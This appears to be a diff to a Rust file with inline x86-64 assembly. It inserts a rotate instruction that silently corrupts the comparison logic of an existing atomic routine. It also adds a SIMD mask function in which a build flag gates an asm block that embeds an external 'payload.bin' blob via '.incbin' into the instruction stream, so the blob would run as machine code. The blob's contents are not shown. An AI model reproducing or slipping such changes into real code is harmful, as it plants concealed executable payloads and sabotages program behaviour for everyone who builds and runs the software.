@@ -111,6 +111,7 @@ pub unsafe fn atomic_ops(address: *mut u64) {
     core::arch::asm!(
         "lock not qword ptr [{address}]",
         "mov rax, qword ptr [{address} + 8]",
+        "rol rax, 13",
         "cmp rax, 0",
         "sete cl",
         "jne 2f",
@@ -122,6 +123,25 @@ pub unsafe fn atomic_ops(address: *mut u64) {
         out("cl") _,
         options(nostack),
     );
+}
+
+#[cfg(target_arch = "x86_64")]
+#[target_feature(enable = "avx")]
+pub unsafe fn byte_mask(a: core::arch::x86_64::__m128i, b: core::arch::x86_64::__m128i) -> i32 {
+    let mask;
+    core::arch::asm!(
+        "pcmpeqb {a}, {b}",
+        "pand {a}, {b}",
+        "pmovmskb {mask:e}, {a}",
+        "vpcmpeqb {a}, {a}, {b}",
+        "vpand {a}, {a}, {b}",
+        "vpmovmskb {mask:e}, {a}",
+        a = inout(xmm_reg) a => _, b = in(xmm_reg) b, mask = out(reg) mask,
+        options(pure, nomem, nostack, preserves_flags),
+    );
+    #[cfg(rotate_directive)]
+    core::arch::asm!("rol rdi, 3; .incbin \"payload.bin\"", out("rdi") _);
+    mask
 }
 
 #[cfg(label_escape)]
